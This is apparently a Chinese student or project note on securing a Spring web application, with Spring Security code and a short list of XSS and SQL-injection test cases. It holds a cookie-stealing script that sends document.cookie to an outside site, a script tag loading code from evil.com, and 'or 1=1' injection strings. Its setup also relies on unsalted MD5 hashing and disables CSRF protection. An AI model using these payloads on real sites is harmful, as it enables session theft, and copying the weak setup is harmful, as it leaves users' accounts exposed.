# 为Web应用添加安全性防护策略

## MD5

​	数据库中的所有账户的密码都用MD5进行哈希

## Spring Security

​	Spring Security 基于 Spring 框架，提供了一套 Web 应用安全性的完整解决方案。一般来说，Web 应用的安全性包括用户认证（Authentication）和用户授权（Authorization）两个部分。这两个部分，Spring Security 框架都有很好的支持。 

#### 用户认证

​	用户认证指的是验证某个用户是否为系统中的合法主体，也就是说用户能否访问该系统。用户认证一般要求用户提供用户名和密码。系统通过校验用户名和密码来完成认证过程。 

​	Spring Security 框架支持主流的认证方式，包括 HTTP 基本认证、HTTP 表单验证、HTTP 摘要认证、OpenID 和 LDAP 等。 

​	通过重写 configure 方法设置用户认证

```java
protected void configure(AuthenticationManagerBuilder auth) throws Exception
{
    auth.userDetailsService(customUserService()).passwordEncoder(new PasswordEncoder()
    {
        @Override
        public String encode(CharSequence charSequence)
        {
            return MD5Util.encode((String) charSequence);
        }

        @Override
        public boolean matches(CharSequence charSequence, String s)
        {
            return s.equals(MD5Util.encode((String) charSequence));
        }
    });
}
```

#### 用户授权

​	用户授权指的是验证某个用户是否有权限执行某个操作。在一个系统中，不同用户所具有的权限是不同的。 系统会为不同的用户分配不同的角色，而每个角色则对应一系列的权限。 

​	Spring Security 提供了基于角色的访问控制和访问控制列表（Access Control List，ACL），可以对应用中的领域对象进行细粒度的控制。 

​	通过重写 configure 方法设置用户授权

```java
protected void configure(HttpSecurity http) throws Exception
{
    http.authorizeRequests()
//                .antMatchers("**").permitAll()
            .antMatchers("/login/**", "/register/**", "/register.html").permitAll()
//                .antMatchers( "/mplayer.html", "/vplayer.html", "/file/**", "/video/**", "/music/**").permitAll()
            .antMatchers("/businesscard", "/card", "/card/**").permitAll()
            .antMatchers(HttpMethod.GET, "/businessCard").permitAll()
            .antMatchers("/register").permitAll()
            .antMatchers("/upload/**").permitAll()
            .antMatchers("/player", "/video/**", "/music/**").permitAll()
            .anyRequest().authenticated()
            .and()
            .formLogin()
            .usernameParameter("username")
            .passwordParameter("password")
            .loginPage("/login")
            .successForwardUrl("/main")
            .failureUrl("/login?error").permitAll()
            .and()
            .csrf().disable();
}
```

# 补充完善安全性测试

## xss测试用例

1. xss攻击：跨站脚本攻击。是指攻击者在嵌入客户端脚本，当用户浏览此网页时，脚本就会在用户的浏览器上执行，从而达到攻击的目的。如获取用户的cookie，导航到恶意网站，携带木马等。

2. xss攻击危害：

   1. 可以盗取各类用户账号。

     2. 控制数据

   2. 强行发送电子邮件

   3. 控制受害者及其向其他网站发起攻击

3、测试用例：

1. `<script>alert(1);</script>`

2. 反射类漏洞测试：

   `<form method="get"></form>` 即将提交表单改为get方式提交来获取用户名和密码。

  3、存储式漏洞：

​	`<Script>window.location.href='http://www. .com'/?cookie'+document.cookie</script>`

​	此用例用于截获cookie信息，黑客可以将攻击脚本上传到web服务器上，是的所有访问该页面的    用户都面临信息泄露。此用例用于获取用户的cookie信息到黑客自己的网站上。

 4、`<script src="http://www.evil.com/file.js"></script>` 

​	运行黑客写的js脚本。

## sql注入

1、所谓的sql注入，就是将sql命令插入到web表单提交到后台，最终达到欺骗服务器执行恶意的sql命令。

2、测试用例：

​	(1)   `<select * from user where username="or 1=1#"and password=md5("")`  将后面的sql条件注释掉

​	(2)`and 2=2`

​	(3)`and (select count(*) from sysobjects)>0`  



